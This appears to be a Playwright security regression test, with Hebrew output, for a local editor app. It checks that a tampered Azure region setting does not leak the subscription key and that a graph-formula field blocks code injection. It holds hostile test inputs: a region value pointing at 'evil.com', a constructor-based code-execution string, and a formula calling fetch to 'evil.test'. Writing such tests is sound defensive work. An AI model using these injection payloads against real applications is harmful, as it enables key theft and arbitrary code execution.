import { chromium } from 'playwright';
import { pathToFileURL } from 'url';
import path from 'path'; import { fileURLToPath } from 'url';
const __dirname=path.dirname(fileURLToPath(import.meta.url));
const HTML=path.resolve(__dirname,'..','MyWord-v2.html');
const browser=await chromium.launch();
const page=await browser.newPage({viewport:{width:1400,height:1000}});
const errs=[]; page.on('pageerror',e=>errs.push(e.message));
await page.goto(pathToFileURL(HTML).href,{waitUntil:'networkidle'});
await page.waitForSelector('#editor'); await page.waitForTimeout(800);
const say=(n,v,d='')=>console.log(`${v?'✅':'❌'} ${n}${d?'  ['+d+']':''}`);

console.log('\n══ ממצא 1 — azureRegion ══');
const r1=await page.evaluate(async()=>{
  const out={};
  const orig=window.fetch; let hit=null;
  window.fetch=(u,o)=>{hit={url:String(u),key:o&&o.headers&&o.headers['Ocp-Apim-Subscription-Key']};
    return Promise.reject(new Error('blocked-by-test'));};
  localStorage.setItem('myword2_tts', JSON.stringify({azureKey:'SECRET123',azureRegion:'evil.com/x?a=',persona:'ben'}));
  out.stored=JSON.parse(localStorage.getItem('myword2_tts')).azureRegion;
  window.fetch=orig;
  return out;
});
console.log('ערך זדוני שנשמר ידנית ל-localStorage:', r1.stored);
await page.reload({waitUntil:'networkidle'}); await page.waitForSelector('#editor'); await page.waitForTimeout(900);
const r2=await page.evaluate(async()=>{
  let hit=null; const orig=window.fetch;
  window.fetch=(u,o)=>{hit={url:String(u),key:o&&o.headers&&o.headers['Ocp-Apim-Subscription-Key']};return Promise.reject(new Error('x'));};
  try{ const b=document.getElementById('tlSpeak'); if(b) b.click(); }catch(e){}
  await new Promise(r=>setTimeout(r,900));
  window.fetch=orig;
  return hit;
});
if(r2){ const host=(()=>{try{return new URL(r2.url).host}catch(e){return '?'}})();
  say('הבקשה הלכה למארח של Microsoft בלבד', /\.tts\.speech\.microsoft\.com$/.test(host), host);
  say('המפתח לא דלף למארח זר', /\.tts\.speech\.microsoft\.com$/.test(host)||!r2.key, 'key='+(r2.key?'נשלח':'לא נשלח'));
} else console.log('ℹ️ לא בוצעה קריאת-רשת (אין מפתח פעיל/ההקראה לא הופעלה) — נבדק סטטית למטה');
const stat=await page.evaluate(()=>{
  const src=[...document.scripts].map(s=>s.textContent).join('\n');
  return { hasGuard:/\^\[a-z0-9-\]\{2,40\}\$/.test(src),
           guards:(src.match(/\[a-z0-9-\]\{2,40\}/g)||[]).length };
});
say('ולידציית region קיימת בקוד (2 אתרים: שמירה + fetch)', stat.hasGuard&&stat.guards>=2, `${stat.guards} מופעים`);

console.log('\n══ ממצא 2 — נוסחת הגרף ══');
const g=await page.evaluate(async()=>{
  delete window.__GPWN;
  const res={};
  const run=async(formula)=>{
    const inp=document.getElementById('_graphFn');
    if(!inp) return 'אין שדה';
    inp.value=formula;
    const btn=[...document.querySelectorAll('button')].find(b=>/צייר|שרטט|גרף/.test(b.textContent))||null;
    if(btn) btn.click(); else inp.dispatchEvent(new Event('input',{bubbles:true}));
    await new Promise(r=>setTimeout(r,350));
    return 'ok';
  };
  if(window.openCalculator) window.openCalculator();
  await new Promise(r=>setTimeout(r,600));
  const gm=[...document.querySelectorAll('button')].find(b=>/גרף/.test(b.textContent));
  if(gm) gm.click();
  await new Promise(r=>setTimeout(r,500));
  res.legit=await run('sin(x)+x^2');
  res.evil1=await run('(window.__GPWN=1)');
  res.evil2=await run('constructor.constructor("window.__GPWN=2")()');
  res.evil3=await run('x;fetch("https://evil.test")');
  res.pwned=!!window.__GPWN;
  return res;
});
console.log(JSON.stringify(g));
say('נוסחה זדונית לא הריצה קוד', !g.pwned, 'window.__GPWN='+g.pwned);
const gstat=await page.evaluate(()=>{
  const src=[...document.scripts].map(s=>s.textContent).join('\n');
  return /_MATH_OK|getOwnPropertyNames\(Math\)/.test(src);
});
say('רשימת-היתר לנוסחה קיימת בקוד', gstat);

console.log('\nשגיאות: '+errs.length);
await browser.close();
